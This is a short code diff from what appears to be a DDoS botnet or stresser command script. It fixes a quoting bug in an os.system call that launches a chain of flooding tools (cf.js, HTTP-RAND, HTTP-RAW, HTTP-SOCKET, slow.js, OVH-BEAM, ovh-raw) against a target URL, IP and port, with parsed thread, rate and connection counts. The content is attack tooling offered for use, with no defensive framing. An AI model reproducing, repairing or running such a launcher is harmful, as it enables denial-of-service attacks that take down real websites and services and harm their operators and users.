@@ -237,7 +237,7 @@ def main():
             per = cnc.split()[4]
             port = cnc.split()[5]
             conns = cnc.split()[6]
-            os.system(f'node cf.js {url} {time} {thread} && node HTTP-RAND.js {url} {time} && node HTTP-RAW {url} {time} && node HTTP-SOCKET {url} {per} {time} && node slow.js {url} {time} && ./OVH-BEAM GET {ip} {port} {time} 1024 && ./ovh-raw GET {ip} {port} {time} {conns}'')
+            os.system(f'node cf.js {url} {time} {thread} && node HTTP-RAND.js {url} {time} && node HTTP-RAW {url} {time} && node HTTP-SOCKET {url} {per} {time} && node slow.js {url} {time} && ./OVH-BEAM GET {ip} {port} {time} 1024 && ./ovh-raw GET {ip} {port} {time} {conns}')
             
             
 
